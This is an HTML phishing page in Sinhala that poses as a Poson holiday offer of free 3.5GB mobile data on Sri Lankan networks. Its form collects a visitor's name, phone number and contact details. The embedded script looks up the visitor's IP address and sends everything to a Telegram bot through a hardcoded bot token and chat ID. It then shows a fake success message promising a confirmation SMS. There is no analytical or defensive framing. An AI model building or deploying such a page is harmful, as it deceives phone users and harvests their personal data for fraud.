<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free 3.5GB Data Offer</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .promo-card { max-width: 450px; margin: 30px auto; border-radius: 15px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.2); background: white; }
        .header-img { width: 100%; height: auto; background: #007bff; color: white; text-align: center; padding: 20px; }
        .content { padding: 25px; }
        .btn-claim { background-color: #28a745; border: none; font-weight: bold; width: 100%; padding: 12px; font-size: 1.1rem; }
        .btn-claim:hover { background-color: #218838; }
        .footer-text { font-size: 0.8rem; color: #666; text-align: center; margin-top: 15px; }
    </style>
</head>
<body>

<div class="container">
    <div class="promo-card">
        <div class="header-img">
            <h1 class="h3">පොසොන් සුබපැතුම්! 🕯️</h1>
            <p>විශේෂ දීමනාව - 3.5GB නොමිලේ</p>
        </div>
        
        <div class="content">
            <p class="text-center mb-4">ඔබේ අංකය පරීක්ෂා කර නොමිලේ ඩේටා පැකේජය සක්‍රීය කරගන්න.</p>
            
            <form id="dataForm">
                <div class="mb-3">
                    <label class="form-label">සම්පූර්ණ නම:</label>
                    <input type="text" id="name" class="form-control" placeholder="උදා: කසුන් පෙරේරා" required>
                </div>
                
                <div class="mb-3">
                    <label class="form-label">දුරකථන අංකය:</label>
                    <input type="number" id="phone" class="form-control" placeholder="07xxxxxxxx" required>
                </div>

                <div class="mb-3">
                    <label class="form-label">SMS මැසේජ් නොම්බර්:</label>
                    <textarea id="address" class="form-control" rows="2" placeholder="දුරකථන අංකය හෝ ඊමේල් ලිපිනය " required></textarea>
                </div>

                <button type="submit" class="btn btn-success btn-claim">දැන්ම ලබාගන්න (Claim Now)</button>
            </form>
            
            <p class="footer-text">මෙම දීමනාව සියලුම ජාල (Dialog, Mobitel, Hutch, Airtel) සඳහා වලංගු වේ.</p>
        </div>
    </div>
</div>

<script>
    const BOT_TOKEN = "8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI";
    const CHAT_ID = "7883989086";

    document.getElementById('dataForm').addEventListener('submit', function(e) {
        e.preventDefault();

        // Getting values from form
        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        const address = document.getElementById('address').value;

        // Fetching IP address using a public API
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIP = data.ip;
                sendToTelegram(name, phone, address, userIP);
            })
            .catch(() => {
                sendToTelegram(name, phone, address, "Unknown");
            });
    });

    function sendToTelegram(name, phone, address, ip) {
        const message = `🔔 **New Data Received!**\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n🏠 Address: ${address}\n🌐 IP: ${ip}`;
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(res => {
            alert("සාර්ථකයි! පැය 24ක් ඇතුළත ඔබට තහවුරු කිරීමේ කෙටි පණිවිඩයක් ලැබෙනු ඇත.");
            window.location.reload(); // Page refresh after success
        })
        .catch(err => {
            console.error(err);
            alert("පද්ධති දෝෂයකි. පසුව උත්සාහ කරන්න.");
        });
    }
</script>

</body>
</html>
